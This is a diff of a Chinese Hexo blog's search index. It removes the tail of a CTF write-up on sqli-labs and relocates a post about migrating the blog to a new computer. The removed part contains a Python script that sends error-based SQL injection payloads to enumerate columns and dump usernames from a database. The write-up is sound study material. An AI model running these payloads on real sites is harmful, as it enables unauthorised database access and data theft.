-#### 这里以users表为例 ####
-print('%s表下的列名:' % table_list[-1])  ###根据我的摸索，里面的数字应该表示顺序，-1表示的应该是倒数第一个，0应该表示第一个
-for i in range(50):
-    payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select column_name from information_schema.columns where table_name='%s' limit %d,1),0x3a,floor(rand(0)*2)))--+''' % (table_list[-1],i)
-    r = requests.get(url + payload)
-    if 'group_key' not in r.text:
-        break
-    column_name = r.text.split(':')[-2]
-    column_list.append(column_name)
-    print('[+]' + column_name)
-### 获取字段值 ###
-#### 这里以username列为例 ####
-print('%s列下的字段值:' % column_list[-2])
-for i in range(50):
-    payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select %s from %s.%s limit %d,1),0x3a,floor(rand(0)*2)))--+''' % (column_list[-2],db_name,table_list[-1],i)
-    r = requests.get(url + payload)
-    if 'group_key' not in r.text:
-        break
-    dump = r.text.split(':')[-2]
-    print('[+]' + dump)
-</code></pre>
-<h4 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h4><p>You have  an error in your SQL syntax; check the manual that corresponds to your  MySQL server version for the right syntax to use <strong>near ‘“1””</strong> LIMIT 0,1’  at line 1</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>尝试用typora写博客</title>
     <url>/2020/07/03/typora/</url>
     <content><![CDATA[<p>​    昨天花了一番时间搭建好博客后，匆匆用记事本写了一句话作为纪念，将其作为第一条博客测试了一下。成功了，但是总觉得那样写博客有些低效，而且怎么把它搞得花里胡哨呢<span class="github-emoji"><span>❓</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2753.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p>
@@ -5885,41 +5885,6 @@ xctf Object            //$res2
       <tags>
         <tag>Web</tag>
         <tag>PHP反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>新电脑迁移hexo</title>
-    <url>/2025/07/16/%E6%96%B0%E7%94%B5%E8%84%91%E8%BF%81%E7%A7%BBhexo/</url>
-    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>换电脑有段时间了，但是一直没有将hexo博客给迁移到新电脑上，最近研究了一下如何迁移，在这里做一个记录，也作为迁移后的第一篇博客</p>
-<p>主要参考下面这篇文章进行：</p>
-<p><a href="https://blog.csdn.net/qq_36667170/article/details/118163563">换电脑后怎么迁移hexo博客？_hexo换电脑了怎么办-CSDN博客</a></p>
-<h3 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><p>1.<code>git bash here</code>卡死</p>
-<p>尝试过重装、降低git版本、装在C盘等方法都没有解决，后面直接用<code>cmd</code>执行相关命令</p>
-<p><img src="https://typics.oss-cn-hangzhou.aliyuncs.com/img/image-20250712224330583.png" alt="image-20250712224330583"></p>
-<p>2.Typora配置阿里云OSS存储权限问题</p>
-<p>参考<a href="https://blog.csdn.net/mayuxin1314/article/details/125911299">Typora+阿里云OSS实现图片自动上传（不需要安装软件）_typora oss-CSDN博客</a></p>
-<p>不过需要注意创建RAM用户后需要为用户分配相应的权限，例如<code>AliyunOSSFullAccess</code>，否则测试上传的实现会报错权限问题。</p>
-<h3 id="待解决的问题"><a href="#待解决的问题" class="headerlink" title="待解决的问题"></a>待解决的问题</h3><p>1.深入学习一下git，后续应该是可以通过git在不同的电脑上进行提交</p>
-<p>2.git bash here卡死问题</p>
-<h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><p>最近在折腾博客的时候cursor误删了hexo本地文件夹，我想着GitHub上反正有备份，应该没有问题，结果clone下来一看和hexo本地文件夹并不太一样，还好之前U盘里有老的备份。</p>
-<p>其实，Github上存的只是生成后的静态文件，其实是源码文件夹下的public文件夹的内容</p>
-<pre><code>index.html
-css/
-js/
-images/
-</code></pre>
-<p>没有 <code>source/ themes/ package.json</code></p>
-<p>所以没办法<code>hexo s</code></p>
-<p>所以为了以后换电脑之后更好备份，也为了多台电脑之间可以协作，可以再创建一个仓库存储源码</p>
-<p>仓库 1：<code>blog-source</code>（存 Hexo 源码，纯存档/协作）</p>
-<p>仓库 2：现在这个（存部署产物，给 GitHub Pages 用）</p>
-]]></content>
-      <categories>
-        <category>技术</category>
-      </categories>
-      <tags>
-        <tag>Git</tag>
-        <tag>hexo</tag>
       </tags>
   </entry>
   <entry>
@@ -8743,6 +8708,41 @@ int main()
         <tag>哈夫曼编码</tag>
         <tag>图</tag>
         <tag>内排序</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>新电脑迁移hexo</title>
+    <url>/2025/07/16/%E6%96%B0%E7%94%B5%E8%84%91%E8%BF%81%E7%A7%BBhexo/</url>
+    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>换电脑有段时间了，但是一直没有将hexo博客给迁移到新电脑上，最近研究了一下如何迁移，在这里做一个记录，也作为迁移后的第一篇博客</p>
+<p>主要参考下面这篇文章进行：</p>
+<p><a href="https://blog.csdn.net/qq_36667170/article/details/118163563">换电脑后怎么迁移hexo博客？_hexo换电脑了怎么办-CSDN博客</a></p>
+<h3 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><p>1.<code>git bash here</code>卡死</p>
+<p>尝试过重装、降低git版本、装在C盘等方法都没有解决，后面直接用<code>cmd</code>执行相关命令</p>
+<p><img src="https://typics.oss-cn-hangzhou.aliyuncs.com/img/image-20250712224330583.png" alt="image-20250712224330583"></p>
+<p>2.Typora配置阿里云OSS存储权限问题</p>
+<p>参考<a href="https://blog.csdn.net/mayuxin1314/article/details/125911299">Typora+阿里云OSS实现图片自动上传（不需要安装软件）_typora oss-CSDN博客</a></p>
+<p>不过需要注意创建RAM用户后需要为用户分配相应的权限，例如<code>AliyunOSSFullAccess</code>，否则测试上传的实现会报错权限问题。</p>
+<h3 id="待解决的问题"><a href="#待解决的问题" class="headerlink" title="待解决的问题"></a>待解决的问题</h3><p>1.深入学习一下git，后续应该是可以通过git在不同的电脑上进行提交</p>
+<p>2.git bash here卡死问题</p>
+<h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><p>最近在折腾博客的时候cursor误删了hexo本地文件夹，我想着GitHub上反正有备份，应该没有问题，结果clone下来一看和hexo本地文件夹并不太一样，还好之前U盘里有老的备份。</p>
+<p>其实，Github上存的只是生成后的静态文件，其实是源码文件夹下的public文件夹的内容</p>
+<pre><code>index.html
+css/
+js/
+images/
+</code></pre>
+<p>没有 <code>source/ themes/ package.json</code></p>
+<p>所以没办法<code>hexo s</code></p>
+<p>所以为了以后换电脑之后更好备份，也为了多台电脑之间可以协作，可以再创建一个仓库存储源码</p>
+<p>仓库 1：<code>blog-source</code>（存 Hexo 源码，纯存档/协作）</p>
+<p>仓库 2：现在这个（存部署产物，给 GitHub Pages 用）</p>
+]]></content>
+      <categories>
+        <category>技术</category>
+      </categories>
+      <tags>
+        <tag>Git</tag>
+        <tag>hexo</tag>
       </tags>
   </entry>
   <entry>
